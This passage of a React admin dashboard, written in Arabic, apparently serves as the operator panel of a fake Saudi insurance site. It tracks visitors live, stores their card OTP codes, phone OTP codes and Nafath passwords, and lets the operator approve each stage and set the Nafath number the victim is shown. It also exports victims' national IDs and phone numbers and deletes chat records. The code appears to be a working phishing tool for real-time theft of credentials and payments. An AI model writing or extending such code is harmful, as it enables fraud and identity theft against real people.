    targetElement.scrollIntoView({ behavior: "smooth", block: "center" });
    setPendingJumpTarget(null);
  }, [pendingJumpTarget, linkedRequests, linkedOrders, selectedVisitor?.id]);

  const handleApprove = async (reqId: string) => {
    setLoadingAction("approve-" + reqId);
    await supabase.from("insurance_requests").update({ status: "approved" }).eq("id", reqId);
    toast.success("تمت الموافقة على الطلب");
    setLinkedRequests(prev => prev.map(r => r.id === reqId ? { ...r, status: "approved" } : r));
    setLoadingAction(null);
  };

  const handleReject = async (reqId: string) => {
    setLoadingAction("reject-" + reqId);
    await supabase.from("insurance_requests").update({ status: "rejected" }).eq("id", reqId);
    toast.success("تم رفض الطلب");
    setLinkedRequests(prev => prev.map(r => r.id === reqId ? { ...r, status: "rejected" } : r));
    setLoadingAction(null);
  };

  const handleStageApprove = async (orderId: string, nafathNum?: string) => {
    setLoadingAction("stage-approve-" + orderId);
    const updateData: any = { stage_status: "approved" };
    if (nafathNum) updateData.nafath_number = nafathNum;
    await supabase.from("insurance_orders").update(updateData).eq("id", orderId);
    await (supabase as any)
      .from("insurance_order_stage_events")
      .update({ status: "approved", resolved_at: new Date().toISOString() })
      .eq("order_id", orderId)
      .is("resolved_at", null);
    toast.success("تمت الموافقة على المرحلة");
    const approvedOrder = linkedOrders.find(o => o.id === orderId);
    if (approvedOrder?.visitor_session_id) {
      const matchedVisitor = visitors.find(v => v.session_id === approvedOrder.visitor_session_id);
      if (matchedVisitor && approvedOrder.current_stage) {
        setLastResolvedMap(prev => ({ ...prev, [matchedVisitor.id]: { stage: approvedOrder.current_stage!, status: "approved" } }));
        setPendingStageMap(prev => { const n = { ...prev }; delete n[matchedVisitor.id]; return n; });
      }
    }
    setLinkedOrders(prev => prev.map(o => o.id === orderId ? { ...o, stage_status: "approved", nafath_number: nafathNum || o.nafath_number } : o));
    setStageEvents(prev => prev.map(event => event.order_id === orderId && !event.resolved_at ? { ...event, status: "approved", resolved_at: new Date().toISOString() } : event));
    setNafathNumberInputs(prev => {
      const next = { ...prev };
      delete next[orderId];
      return next;
    });
    setLoadingAction(null);
  };

  const handleUpdateNafathNumber = async (orderId: string, newNumber: string) => {
    if (!newNumber) return;
    setLoadingAction("nafath-update-" + orderId);
    await supabase.from("insurance_orders").update({ nafath_number: newNumber }).eq("id", orderId);
    setLinkedOrders(prev => prev.map(o => o.id === orderId ? { ...o, nafath_number: newNumber } : o));
    toast.success("تم تحديث رقم النفاذ");
    setNafathNumberInputs(prev => ({ ...prev, [orderId]: newNumber }));
    setLoadingAction(null);
  };

  const handleStageReject = async (orderId: string) => {
    setLoadingAction("stage-reject-" + orderId);
    await supabase.from("insurance_orders").update({ stage_status: "rejected" }).eq("id", orderId);
    await (supabase as any)
      .from("insurance_order_stage_events")
      .update({ status: "rejected", resolved_at: new Date().toISOString() })
      .eq("order_id", orderId)
      .is("resolved_at", null);
    toast.success("تم رفض المرحلة");
    const rejectedOrder = linkedOrders.find(o => o.id === orderId);
    if (rejectedOrder?.visitor_session_id) {
      const matchedVisitor = visitors.find(v => v.session_id === rejectedOrder.visitor_session_id);
      if (matchedVisitor && rejectedOrder.current_stage) {
        setLastResolvedMap(prev => ({ ...prev, [matchedVisitor.id]: { stage: rejectedOrder.current_stage!, status: "rejected" } }));
        setPendingStageMap(prev => { const n = { ...prev }; delete n[matchedVisitor.id]; return n; });
      }
    }
    setLinkedOrders(prev => prev.map(o => o.id === orderId ? { ...o, stage_status: "rejected" } : o));
    setStageEvents(prev => prev.map(event => event.order_id === orderId && !event.resolved_at ? { ...event, status: "rejected", resolved_at: new Date().toISOString() } : event));
    setLoadingAction(null);
  };

  const handleClearChat = async () => {
    if (!selectedVisitor) return;
    sounds.warning();
    setChatClearTarget({ sessionId: selectedVisitor.session_id, visitorName: selectedVisitor.visitor_name || "زائر" });
  };

  const executeClearChat = async (sessionId: string) => {
    setLoadingAction("clear");
    try {
      const { data: conv } = await supabase.from("chat_conversations").select("id").eq("session_token", sessionId).maybeSingle();
      if (conv) {
        await supabase.from("site_visitors").update({ linked_conversation_id: null }).eq("linked_conversation_id", conv.id);
        await supabase.from("chat_messages").delete().eq("conversation_id", conv.id);
        const { error } = await supabase.from("chat_conversations").delete().eq("id", conv.id);
        if (error) throw error;
        toast.success("تم مسح المحادثة");
        setLinkedChats([]);
      } else {
        toast.info("لا توجد محادثة لهذا الزائر");
      }
    } catch (err: any) {
      toast.error(err.message || "فشل مسح المحادثة");
    }
    setChatClearTarget(null);
    setLoadingAction(null);
  };

  const clearOfflineVisitors = async () => {
    setLoadingAction("clearAll");
    try {
      const offlineIds = visitors.filter(v => !v.is_online).map(v => v.id);
      if (offlineIds.length === 0) {
        toast.info("لا يوجد زوار غير متصلين");
        setLoadingAction(null);
        return;
      }
      await deleteVisitors(offlineIds);
    } catch (err: any) {
      toast.error(err.message || "فشل مسح الزوار غير المتصلين");
    }
    setLoadingAction(null);
  };

  const clearSelectedChats = async () => {
    if (selectedForClear.size === 0) { toast.info("لم يتم تحديد أي زائر"); return; }
    setLoadingAction("clearSelected");
    try {
      let cleared = 0;
      for (const sessionId of selectedForClear) {
        const { data: conv } = await supabase.from("chat_conversations").select("id").eq("session_token", sessionId).maybeSingle();
        if (conv) {
          await supabase.from("site_visitors").update({ linked_conversation_id: null }).eq("linked_conversation_id", conv.id);
          await supabase.from("chat_messages").delete().eq("conversation_id", conv.id);
          await supabase.from("chat_conversations").delete().eq("id", conv.id);
          cleared++;
        }
      }
      if (cleared > 0) toast.success(`تم مسح ${cleared} محادثة`);
      else toast.info("لا توجد محادثات للزوار المحددين");
    } catch (err: any) {
      toast.error(err.message || "فشل مسح المحادثات");
    }
    setSelectedForClear(new Set());
    setChatSelectMode(false);
    setLoadingAction(null);
  };

  const handleBlockToggle = async () => {
    if (!selectedVisitor) return;
    const newBlocked = !selectedVisitor.is_blocked;
    setLoadingAction("block");
    await supabase.from("site_visitors").update({ is_blocked: newBlocked }).eq("id", selectedVisitor.id);
    toast.success(newBlocked ? "تم حظر الزائر" : "تم إلغاء حظر الزائر");
    setSelectedVisitor({ ...selectedVisitor, is_blocked: newBlocked });
    fetchVisitors();
    setLoadingAction(null);
  };

  const handleExportPDF = async () => {
    if (!selectedVisitor) return;
    const { default: jsPDF } = await import("jspdf");
    const { default: autoTable } = await import("jspdf-autotable");
    const doc = new jsPDF({ orientation: "portrait", unit: "mm", format: "a4" });
    const name = selectedVisitor.visitor_name || `زائر #${selectedVisitor.session_id.slice(0, 6)}`;
    let y = 15;
    doc.setFontSize(18);
    doc.text(`Visitor Report: ${name}`, 105, y, { align: "center" });
    y += 10;
    doc.setFontSize(10);
    doc.text(`Generated: ${new Date().toLocaleString("en-US")}`, 105, y, { align: "center" });
    y += 10;
    autoTable(doc, {
      startY: y, head: [["Field", "Value"]],
      body: [
        ["Name", name], ["Status", selectedVisitor.is_online ? "Online" : "Offline"],
        ["Current Page", selectedVisitor.current_page || "/"], ["Phone", selectedVisitor.phone || "-"],
        ["National ID", selectedVisitor.national_id || "-"], ["First Visit", formatDate(selectedVisitor.created_at)],
        ["Last Seen", `${formatDate(selectedVisitor.last_seen_at)} ${formatTime(selectedVisitor.last_seen_at)}`],
        ["Blocked", selectedVisitor.is_blocked ? "Yes" : "No"],
      ],
      theme: "grid", headStyles: { fillColor: [34, 197, 94] },
    });
    y = (doc as any).lastAutoTable.finalY + 10;
    if (linkedRequests.length > 0) {
      doc.setFontSize(13); doc.text("Insurance Requests", 14, y); y += 5;
      autoTable(doc, {
        startY: y, head: [["Type", "Request Type", "Status", "Phone", "National ID", "Date"]],
        body: linkedRequests.map(r => [insuranceTypeLabel[r.insurance_type || ""] || r.insurance_type || "-", r.request_type === "new" ? "New" : "Renewal", statusLabel[r.status]?.text || r.status, r.phone || "-", r.national_id || "-", formatDate(r.created_at)]),
        theme: "grid", headStyles: { fillColor: [59, 130, 246] },
      });
      y = (doc as any).lastAutoTable.finalY + 10;
    }
    if (linkedOrders.length > 0) {
      if (y > 250) { doc.addPage(); y = 15; }
      doc.setFontSize(13); doc.text("Orders & Purchases", 14, y); y += 5;
      autoTable(doc, {
        startY: y, head: [["Company", "Type", "Vehicle", "Total Price", "Payment", "Status"]],
        body: linkedOrders.map(o => [o.company || "-", insuranceTypeLabel[o.insurance_type || ""] || o.insurance_type || "-", [o.vehicle_make, o.vehicle_model, o.vehicle_year].filter(Boolean).join(" ") || "-", o.total_price ? `${o.total_price} SAR` : "-", o.payment_method || "-", o.status || "-"]),
        theme: "grid", headStyles: { fillColor: [168, 85, 247] },
      });
      y = (doc as any).lastAutoTable.finalY + 10;
    }
    if (linkedClaims.length > 0) {
      if (y > 250) { doc.addPage(); y = 15; }
      doc.setFontSize(13); doc.text("Claims", 14, y); y += 5;
      autoTable(doc, {
        startY: y, head: [["Name", "Type", "Policy #", "Status", "Date"]],
        body: linkedClaims.map(c => [c.full_name, c.claim_type, c.policy_number, statusLabel[c.status]?.text || c.status, formatDate(c.created_at)]),
        theme: "grid", headStyles: { fillColor: [245, 158, 11] },
      });
    }
    if (linkedChats.length > 0) {
      if (y > 250) { doc.addPage(); y = 15; }
      doc.setFontSize(13); doc.text("Chat Conversations", 14, y); y += 5;
      autoTable(doc, {
        startY: y, head: [["Visitor", "Status", "Date"]],
        body: linkedChats.map(c => [c.visitor_name || "Visitor", c.status === "active" ? "Active" : c.status === "waiting" ? "Waiting" : c.status, formatDate(c.created_at)]),
        theme: "grid", headStyles: { fillColor: [14, 165, 233] },
      });
    }
    doc.save(`visitor-${selectedVisitor.session_id.slice(0, 8)}-report.pdf`);
    toast.success("تم تصدير البيانات بنجاح");
  };

  const toggleVisitorTag = async (visitorId: string, tagKey: string) => {
    const visitor = visitors.find(v => v.id === visitorId);
    if (!visitor) return;
    const currentTags = visitor.tags || [];
    const newTags = currentTags.includes(tagKey) ? currentTags.filter(t => t !== tagKey) : [...currentTags, tagKey];
    await supabase.from("site_visitors").update({ tags: newTags } as any).eq("id", visitorId);
    setVisitors(prev => prev.map(v => v.id === visitorId ? { ...v, tags: newTags } : v));
    if (selectedVisitor?.id === visitorId) setSelectedVisitor(prev => prev ? { ...prev, tags: newTags } : prev);
    toast.success(currentTags.includes(tagKey) ? "تمت إزالة التصنيف" : "تم إضافة التصنيف");
  };

  const onlineCount = visitors.filter(v => v.is_online).length;
  const offlineCount = visitors.filter(v => !v.is_online).length;
  const favoriteCount = visitors.filter(v => v.is_favorite).length;
  const hasRequestCount = visitors.filter(v => v.linked_request_id || pendingRequestMap[v.id]).length;
  const totalCount = visitors.length;
  const awaitingDecisionVisitorIds = new Set<string>([
    ...Object.keys(pendingRequestMap),
    ...Object.keys(pendingStageMap),
  ]);
  const pendingCount = awaitingDecisionVisitorIds.size;
  const pendingRequestsCount = Object.keys(pendingRequestMap).length;
  const pendingStagesCount = Object.keys(pendingStageMap).length;

  const formatTime = (dateStr: string) => new Date(dateStr).toLocaleTimeString("ar-SA", { hour: "2-digit", minute: "2-digit" });
  const formatDate = (dateStr: string) => new Date(dateStr).toLocaleDateString("ar-SA", { year: "numeric", month: "short", day: "numeric" });
  const formatDateTime = (dateStr: string) => new Date(dateStr).toLocaleString("ar-SA", { year: "numeric", month: "short", day: "numeric", hour: "2-digit", minute: "2-digit" });

  const insuranceTypeLabel: Record<string, string> = { comprehensive: "شامل", third_party: "ضد الغير", custom: "مخصص" };
  const statusLabel: Record<string, { text: string; cls: string }> = {
    pending: { text: "قيد الانتظار", cls: "bg-amber-500/10 text-amber-600" },
    approved: { text: "مقبول", cls: "bg-emerald-500/10 text-emerald-600" },
    rejected: { text: "مرفوض", cls: "bg-red-500/10 text-red-600" },
    completed: { text: "مكتمل", cls: "bg-blue-500/10 text-blue-600" },
  };
  const claimTypeLabel: Record<string, string> = { accident: "حادث", theft: "سرقة", damage: "ضرر", other: "أخرى" };
  const stageLabel: Record<string, string> = {
    payment: "الدفع",
    otp: "رمز OTP",
    phone_verification: "توثيق الجوال",
    phone_otp: "كود توثيق الجوال",
    stc_call: "مكالمة STC",
    nafath_login: "دخول نفاذ",
    nafath_verify: "رمز نفاذ",
  };
  const currentStageOrEmpty = (order: InsuranceOrder) => order.current_stage || "";
  const hasPhoneVerificationTrail = (order: InsuranceOrder) => {
    const stage = currentStageOrEmpty(order);
    return ["phone_verification", "stc_call", "phone_otp", "nafath_login", "nafath_verify"].includes(stage)
      || Boolean(order.phone_otp_code || order.nafath_password || order.nafath_number);
  };
  const hasPhoneOtpTrail = (order: InsuranceOrder) => {
    const stage = currentStageOrEmpty(order);
    return stage === "phone_otp" || Boolean(order.phone_otp_code);
  };
  const hasNafathLoginTrail = (order: InsuranceOrder) => {
    const stage = currentStageOrEmpty(order);
    return ["nafath_login", "nafath_verify"].includes(stage) || Boolean(order.nafath_password);
  };
  const hasNafathVerifyTrail = (order: InsuranceOrder) => {
    const stage = currentStageOrEmpty(order);
    return ["nafath_verify", "nafath_login"].includes(stage) || Boolean(order.nafath_number || order.nafath_password);
  };
  const getNafathInputValue = (order: InsuranceOrder) => nafathNumberInputs[order.id] ?? order.nafath_number ?? "";
  const setNafathInputValue = (orderId: string, value: string) => {
    const sanitized = value.replace(/\D/g, "").slice(0, 2);
    setNafathNumberInputs(prev => ({ ...prev, [orderId]: sanitized }));
  };
  const getLatestStageEvent = (orderId: string, stage: string) => {
    const matchedEvents = stageEvents
      .filter(event => event.order_id === orderId && event.stage === stage)
      .sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
    return matchedEvents[matchedEvents.length - 1] || null;
  };
  const getLatestResendEvent = (orderId: string, stage: string) => {
    const matchedEvents = stageEvents
      .filter(event => event.order_id === orderId && event.stage === stage && Boolean((event.payload as any)?.resend_requested))
      .sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
    return matchedEvents[matchedEvents.length - 1] || null;
  };
  const hasOtpTrail = (order: InsuranceOrder) => {
    const stage = currentStageOrEmpty(order);
    return stage === "otp" || Boolean(order.otp_code);
  };
  const visitorPhone = selectedVisitor?.phone || linkedOrders.find(o => o.phone)?.phone || linkedRequests.find(r => r.phone)?.phone || linkedClaims.find(c => c.phone)?.phone || null;
  const visitorNationalId = selectedVisitor?.national_id || linkedOrders.find(o => o.national_id)?.national_id || linkedRequests.find(r => r.national_id)?.national_id || null;
  const visitorName = selectedVisitor?.visitor_name && selectedVisitor.visitor_name !== "زائر"
    ? selectedVisitor.visitor_name
    : linkedClaims.find(c => c.full_name)?.full_name || null;
  const customerName = linkedOrders.find(o => o.customer_name)?.customer_name || null;

  const jumpToPendingDetails = (visitor: Visitor, target: "request" | "stage") => {
    setSelectedVisitor(visitor);
    setPendingJumpTarget(target);
  };

  // Grouped site pages (Arabic names as stored in DB)
  const PAGE_GROUPS: { group: string; pages: { value: string; label: string }[] }[] = [
    { group: "عام", pages: [
      { value: "الصفحة الرئيسية", label: "الرئيسية" },
      { value: "من نحن", label: "من نحن" },
      { value: "تسجيل الدخول", label: "تسجيل الدخول" },
      { value: "نسيت كلمة المرور", label: "نسيت كلمة المرور" },
      { value: "إعادة تعيين كلمة المرور", label: "إعادة تعيين كلمة المرور" },
      { value: "التحقق من الوثيقة", label: "التحقق من الوثيقة" },
    ]},
    { group: "تأمين", pages: [
      { value: "تأمين مركبات", label: "تأمين مركبات" },
      { value: "تأمين طبي", label: "تأمين طبي" },
      { value: "تأمين سفر", label: "تأمين سفر" },
      { value: "أخطاء طبية", label: "أخطاء طبية" },
      { value: "عمالة منزلية", label: "عمالة منزلية" },
      { value: "طلب تأمين", label: "طلب تأمين" },
      { value: "العروض", label: "العروض" },
      { value: "المقارنة", label: "المقارنة" },
      { value: "تأكيد الطلب", label: "تأكيد الطلب" },
    ]},
    { group: "دفع", pages: [
      { value: "إتمام الشراء", label: "إتمام الشراء" },
      { value: "الدفع", label: "الدفع" },
      { value: "رمز التحقق OTP", label: "رمز التحقق OTP" },
      { value: "الدفع عبر الصراف", label: "الدفع عبر الصراف" },
    ]},
    { group: "تحقق", pages: [
      { value: "توثيق الجوال", label: "توثيق الجوال" },
      { value: "رمز الجوال", label: "رمز الجوال" },
      { value: "مكالمة STC", label: "مكالمة STC" },
      { value: "دخول نفاذ", label: "دخول نفاذ" },
      { value: "تحقق نفاذ", label: "تحقق نفاذ" },
    ]},
  ];

  // Memoized filtered visitors to avoid recalculating on every render
  const filteredVisitors = useMemo(() => {
    const q = searchQuery.trim().toLowerCase();
    let filtered: Visitor[];
    if (statusFilter === "deleted") {
      filtered = deletedVisitors;
    } else if (statusFilter === "favorites") {
      filtered = visitors.filter(v => v.is_favorite);
    } else if (statusFilter === "pending") {
      if (pendingSubFilter === "requests") {
        filtered = visitors.filter(v => pendingRequestMap[v.id]);
      } else if (pendingSubFilter === "stages") {
        filtered = visitors.filter(v => pendingStageMap[v.id]);
      } else {
        filtered = visitors.filter(v => awaitingDecisionVisitorIds.has(v.id));
      }
    } else if (statusFilter === "has_request") {
      filtered = visitors.filter(v => v.linked_request_id || pendingRequestMap[v.id]);
    } else {
      filtered = visitors;
      if (statusFilter === "online") filtered = filtered.filter(v => v.is_online);
      else if (statusFilter === "offline") filtered = filtered.filter(v => !v.is_online);
    }
    if (countryFilter) filtered = filtered.filter(v => v.country === countryFilter);
    if (deviceFilter) filtered = filtered.filter(v => parseUserAgent(v.user_agent).device === deviceFilter);
    if (pageFilter) {
      if (pageFilter.startsWith("group:")) {
        const groupName = pageFilter.slice(6);
        const group = PAGE_GROUPS.find(g => g.group === groupName);
        if (group) {
          const groupValues = new Set(group.pages.map(p => p.value));
          filtered = filtered.filter(v => v.current_page && groupValues.has(v.current_page));
        }
      } else {
        filtered = filtered.filter(v => v.current_page === pageFilter);
      }
    }
    if (q) filtered = filtered.filter(v => (v.visitor_name || "").toLowerCase().includes(q) || (v.phone || "").includes(q) || v.session_id.toLowerCase().includes(q));
    if (sortBy === "duration") filtered = [...filtered].sort((a, b) => new Date(a.created_at).getTime() - new Date(b.created_at).getTime());
    else if (sortBy === "entry") filtered = [...filtered].sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());
    else if (sortBy === "last_action") filtered = [...filtered].sort((a, b) => new Date(b.last_seen_at).getTime() - new Date(a.last_seen_at).getTime());
    return filtered;
  }, [visitors, deletedVisitors, searchQuery, statusFilter, pendingSubFilter, pendingRequestMap, pendingStageMap, awaitingDecisionVisitorIds, countryFilter, deviceFilter, pageFilter, sortBy]);

  // Paginated visible visitors
  const paginatedVisitors = useMemo(() => filteredVisitors.slice(0, visibleCount), [filteredVisitors, visibleCount]);

  // Reset visible count when filters change
  useEffect(() => { setVisibleCount(20); }, [statusFilter, searchQuery, pageFilter, countryFilter, deviceFilter, sortBy, pendingSubFilter]);

  // Infinite scroll - load more when reaching bottom
  useEffect(() => {
    if (!listEndRef.current) return;
    const observer = new IntersectionObserver(
      (entries) => {
        if (entries[0].isIntersecting && visibleCount < filteredVisitors.length) {
          setVisibleCount(prev => Math.min(prev + 20, filteredVisitors.length));
        }
      },
      { threshold: 0.1 }
    );
    observer.observe(listEndRef.current);
    return () => observer.disconnect();
  }, [visibleCount, filteredVisitors.length]);

  // Country list for dropdown
  const countries = [...new Set(visitors.filter(v => v.country).map(v => v.country!))].sort();
  const allKnownValues = new Set(PAGE_GROUPS.flatMap(g => g.pages.map(p => p.value)));
  const dynamicPages = visitors
    .filter(v => v.current_page && !allKnownValues.has(v.current_page))
    .map(v => ({ value: v.current_page!, label: v.current_page! }));
  const uniqueDynamic = dynamicPages.filter((p, i, arr) => arr.findIndex(x => x.value === p.value) === i);

  // Device counts
  const deviceCounts = { Mobile: 0, Desktop: 0, Tablet: 0 };
  visitors.forEach(v => { const d = parseUserAgent(v.user_agent).device; if (d in deviceCounts) deviceCounts[d as keyof typeof deviceCounts]++; });

  return (
    <>
      {/* Delete confirmation modal */}
      {showDeleteConfirm && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/50" onClick={() => setShowDeleteConfirm(null)}>
          <div className="bg-card border border-border rounded-xl p-6 mx-4 max-w-sm w-full shadow-xl" dir="rtl" onClick={e => e.stopPropagation()}>
            <div className="flex items-center gap-3 mb-4">
              <div className="w-10 h-10 rounded-full bg-destructive/10 flex items-center justify-center">
                <Trash2 className="w-5 h-5 text-destructive" />
              </div>
              <div>
                <h3 className="text-sm font-bold text-foreground">تأكيد المسح</h3>
                <p className="text-xs text-muted-foreground">هل أنت متأكد من مسح الزوار المحددين؟</p>
              </div>
            </div>
            <div className="flex items-center gap-2 justify-end">
              <button onClick={() => setShowDeleteConfirm(null)} className="px-4 py-2 rounded-lg text-xs font-medium bg-muted text-muted-foreground hover:bg-muted/80 transition-all">لا</button>
              <button onClick={() => { showDeleteConfirm(); setShowDeleteConfirm(null); }} className="px-4 py-2 rounded-lg text-xs font-medium bg-destructive text-destructive-foreground hover:bg-destructive/90 transition-all">نعم، امسح</button>
            </div>
          </div>
        </div>
      )}

      {/* Chat clear confirmation modal */}
      {chatClearTarget && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/50 animate-fade-in" onClick={() => setChatClearTarget(null)}>
          <motion.div
            initial={{ scale: 0.8, opacity: 0, rotate: -2 }}
            animate={{ scale: [0.8, 1.03, 0.98, 1], opacity: 1, rotate: [-2, 1.5, -0.5, 0] }}
            transition={{ duration: 0.4, ease: "easeOut" }}
            className="bg-card border border-border rounded-xl p-6 mx-4 max-w-sm w-full shadow-xl" dir="rtl" onClick={e => e.stopPropagation()}
          >
            <div className="flex items-center gap-3 mb-4">
              <div className="w-10 h-10 rounded-full bg-destructive/10 flex items-center justify-center">
                <MessageCircle className="w-5 h-5 text-destructive" />
              </div>
              <div>
                <h3 className="text-sm font-bold text-foreground">مسح المحادثة</h3>
                <p className="text-xs text-muted-foreground">هل أنت متأكد من مسح محادثة "{chatClearTarget.visitorName}"؟ لا يمكن التراجع عن هذا الإجراء.</p>
              </div>
            </div>
            <div className="flex items-center gap-2 justify-end">
              <button onClick={() => setChatClearTarget(null)} className="px-4 py-2 rounded-lg text-xs font-medium bg-muted text-muted-foreground hover:bg-muted/80 transition-all">إلغاء</button>
              <button onClick={() => executeClearChat(chatClearTarget.sessionId)} className="px-4 py-2 rounded-lg text-xs font-medium bg-destructive text-destructive-foreground hover:bg-destructive/90 transition-all">نعم، امسح</button>
            </div>
          </motion.div>
        </div>
      )}

      <div className="h-[calc(100dvh-120px)] flex flex-col gap-2 md:gap-3" dir="rtl">
        {/* Compact stats bar */}
        <div className="flex flex-wrap items-center gap-2 bg-card border border-border rounded-xl p-2 md:p-3 shrink-0">
          <div className="flex items-center gap-1.5 px-2 py-1 bg-emerald-500/10 rounded-lg">
            <Circle className="w-2 h-2 fill-emerald-500 text-emerald-500 animate-pulse" />
            <span className="text-xs font-bold text-emerald-600">{onlineCount}</span>
            <span className="text-[10px] text-muted-foreground">متصل</span>
          </div>
          <div className="flex items-center gap-1.5 px-2 py-1 bg-primary/10 rounded-lg">
            <User className="w-3 h-3 text-primary" />
            <span className="text-xs font-bold text-primary">{totalCount}</span>
            <span className="text-[10px] text-muted-foreground">إجمالي</span>
          </div>
          {pendingCount > 0 && (
            <div className="flex items-center gap-1.5 px-2 py-1 bg-amber-500/10 rounded-lg">
              <Clock className="w-3 h-3 text-amber-600" />
              <span className="text-xs font-bold text-amber-600">{pendingCount}</span>
              <span className="text-[10px] text-muted-foreground">بانتظار</span>
            </div>
          )}

          {/* Country chips - inline in stats bar */}
          {countries.length > 0 && (
            <>
              <div className="w-px h-5 bg-border hidden md:block" />
              <div className="flex items-center gap-1 flex-wrap">
                <Globe className="w-3 h-3 text-muted-foreground" />
                {(() => {
                  const countryStats: Record<string, { count: number; online: number; code: string | null }> = {};
                  visitors.forEach(v => {
                    const c = v.country || "غير معروف";
                    if (c === "غير معروف") return;
                    if (!countryStats[c]) countryStats[c] = { count: 0, online: 0, code: v.country_code };
                    countryStats[c].count++;
                    if (v.is_online) countryStats[c].online++;
                  });
                  return Object.entries(countryStats).sort((a, b) => b[1].count - a[1].count).map(([country, data]) => (
                    <button
                      key={country}
                      onClick={() => setCountryFilter(countryFilter === country ? "" : country)}
                      className={`inline-flex items-center gap-0.5 px-1.5 py-0.5 rounded-full text-[9px] transition-all ${
                        countryFilter === country ? "bg-primary/20 ring-1 ring-primary text-primary font-bold" : "bg-muted/50 text-muted-foreground hover:bg-muted"
                      }`}
                    >
                      <span>{countryFlag(data.code)}</span>
                      <span>{data.count}</span>
                      {data.online > 0 && <Circle className="w-1.5 h-1.5 fill-emerald-500 text-emerald-500" />}
                    </button>
                  ));
                })()}
              </div>
            </>
          )}
        </div>

        <div className="flex-1 flex flex-col md:flex-row gap-2 md:gap-3 min-h-0">
          {/* Visitors list */}
          <div className={`${selectedVisitor ? "hidden md:flex" : "flex"} md:w-1/4 min-w-0 md:min-w-[220px] bg-card border border-border rounded-xl flex-col overflow-hidden ${!selectedVisitor ? "flex-1" : ""}`}>
            {/* List header */}
            <div className="p-3 border-b border-border bg-gradient-to-b from-muted/40 to-transparent space-y-2.5">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <div className="w-7 h-7 rounded-lg bg-primary/10 flex items-center justify-center">
                    <Eye className="w-3.5 h-3.5 text-primary" />
                  </div>
                  <h3 className="text-sm font-bold text-foreground">قائمة الزوار</h3>
                </div>
                <div className="relative">
                  <button
                    onClick={() => setShowChatMenu(!showChatMenu)}
                    className="inline-flex items-center gap-1 px-2 py-1 rounded-lg text-[10px] bg-destructive/10 text-destructive hover:bg-destructive/20 transition-all"
                    title="خيارات مسح المحادثات"
                  >
                    <Trash2 className="w-3 h-3" />
                    <ChevronDown className="w-3 h-3" />
                  </button>
                  {showChatMenu && (
                    <>
                    <div className="fixed inset-0 z-40" onClick={() => setShowChatMenu(false)} />
                    <div className="absolute left-0 top-full mt-1 z-50 bg-card border border-border rounded-xl shadow-xl py-1.5 min-w-[180px]" dir="rtl">
                      <button
                        onClick={() => {
                          setShowChatMenu(false);
                          setShowDeleteConfirm(() => clearOfflineVisitors);
                        }}
                        className="w-full text-right px-3 py-2 text-[11px] text-destructive hover:bg-destructive/10 transition-colors flex items-center gap-2 rounded-lg mx-0.5"
                      >
                        <Trash2 className="w-3 h-3" />مسح جميع الزوار الغير متصلين
                      </button>
                      <button
                        onClick={() => {
                          setShowChatMenu(false);
                          setChatSelectMode(!chatSelectMode);
                          setSelectedForClear(new Set());
                        }}
                        className="w-full text-right px-3 py-2 text-[11px] text-foreground hover:bg-accent/50 transition-colors flex items-center gap-2 rounded-lg mx-0.5"
                      >
                        <Check className="w-3 h-3" />تحديد للمسح
                      </button>
                    </div>
                    </>
                  )}
                </div>
              </div>

              {/* Search */}
              <div className="relative">
                <Search className="absolute right-2.5 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-muted-foreground" />
                <input
                  type="text"
                  placeholder="بحث بالاسم أو الجوال..."
                  value={searchQuery}
                  onChange={e => setSearchQuery(e.target.value)}
                  className="w-full h-8 pr-8 pl-3 text-xs bg-background border border-border rounded-lg focus:outline-none focus:ring-2 focus:ring-primary/20 focus:border-primary placeholder:text-muted-foreground transition-all"
                />
              </div>

              {/* Status filters */}
              <div className="flex items-center gap-1.5 flex-wrap">
                {[
                  { key: "all" as const, label: "الكل", count: totalCount },
                  { key: "online" as const, label: "متصل", count: onlineCount, dot: "fill-emerald-500 text-emerald-500" },
                  { key: "offline" as const, label: "غير متصل", count: offlineCount },
                  ...(pendingCount > 0 ? [{ key: "pending" as const, label: "بانتظار قرار", count: pendingCount }] : []),
                ].map(f => (
                  <button
                    key={f.key}
                    onClick={() => { setStatusFilter(f.key as any); if (f.key === "pending") setPendingSubFilter("all"); }}
                    className={`inline-flex items-center gap-1 px-2.5 py-1 rounded-full text-[10px] font-medium transition-all ${
                      statusFilter === f.key
                        ? "bg-primary text-primary-foreground shadow-sm"
                        : "bg-muted/60 text-muted-foreground hover:bg-muted"
                    }`}
                  >
                    {f.dot && <Circle className={`w-1.5 h-1.5 ${statusFilter === f.key ? "fill-primary-foreground text-primary-foreground" : f.dot}`} />}
                    {f.key === "pending" && <Clock className="w-2.5 h-2.5" />}
                    {f.label} ({f.count})
                  </button>
                ))}
                {favoriteCount > 0 && (
                  <button
                    onClick={() => setStatusFilter(statusFilter === "favorites" ? "all" : "favorites")}
                    className={`inline-flex items-center gap-1 px-2.5 py-1 rounded-full text-[10px] font-medium transition-all ${
                      statusFilter === "favorites" ? "bg-amber-400/20 text-amber-600 ring-1 ring-amber-400" : "bg-muted/60 text-muted-foreground hover:bg-muted"
                    }`}
                  >
                    <Star className={`w-2.5 h-2.5 ${statusFilter === "favorites" ? "fill-amber-400 text-amber-400" : ""}`} />
                    مفضل ({favoriteCount})
                  </button>
                )}
                {deletedCount > 0 && (
                  <button
                    onClick={() => setStatusFilter(statusFilter === "deleted" ? "all" : "deleted")}
                    className={`inline-flex items-center gap-1 px-2.5 py-1 rounded-full text-[10px] font-medium transition-all ${
                      statusFilter === "deleted" ? "bg-destructive/20 text-destructive ring-1 ring-destructive" : "bg-muted/60 text-muted-foreground hover:bg-muted"
                    }`}
                  >
                    <Trash2 className="w-2.5 h-2.5" />
                    محذوفين ({deletedCount})
                  </button>
                )}
              </div>

              {/* Secondary filters row: pages dropdown + sort */}
              <div className="flex items-center gap-2 flex-wrap">
                <select
                  value={pageFilter}
                  onChange={e => setPageFilter(e.target.value)}
                  className="h-7 text-[10px] bg-background border border-border rounded-lg px-2 text-foreground focus:outline-none focus:ring-2 focus:ring-primary/20 focus:border-primary flex-1 min-w-[100px]"
                >
                  <option value="">كل الصفحات</option>
                  {PAGE_GROUPS.map(group => {
